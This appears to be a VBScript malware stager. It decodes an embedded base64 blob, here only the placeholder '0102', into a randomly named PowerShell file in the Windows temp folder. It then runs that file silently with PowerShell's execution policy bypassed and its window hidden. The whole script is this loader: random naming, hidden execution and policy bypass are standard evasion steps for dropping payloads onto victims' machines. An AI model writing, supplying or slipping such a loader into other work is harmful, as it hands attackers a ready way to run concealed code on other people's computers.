Dim holderX
holderX="0102"

Dim randomFileName

Function GenerateRandomName(length)
    Dim i, randomChar, randomName, chars
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    randomName = ""
    
    Randomize ' Initialize random seed

    For i = 1 To length
        randomChar = Mid(chars, Int((Len(chars) * Rnd) + 1), 1)
        randomName = randomName & randomChar
    Next ' No variable after Next
    
    GenerateRandomName = randomName
End Function


Function GetPS1FilePath()
    Dim fso, shell, destPath
    If randomFileName = "" Then
        randomFileName = GenerateRandomName(10)
    End If
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set shell = CreateObject("WScript.Shell")
    destPath = fso.BuildPath(shell.ExpandEnvironmentStrings("%TEMP%"), randomFileName & ".ps1")
    GetPS1FilePath = destPath   
End Function

DecodeBase64ToFile holderX, GetPS1FilePath
Run

Sub Run()
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    Dim command
    Dim timeDif
    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath() + """"
    shell.Run command, 0, True
End Sub

Function DecodeBase64ToFile(base64String, outputFilePath)
    Dim xmlDoc
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    
    Dim node
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    
    Dim binaryData
    binaryData = node.nodeTypedValue
    
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binaryData
    
    stream.SaveToFile outputFilePath, 2
    stream.Close
    
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
End Function
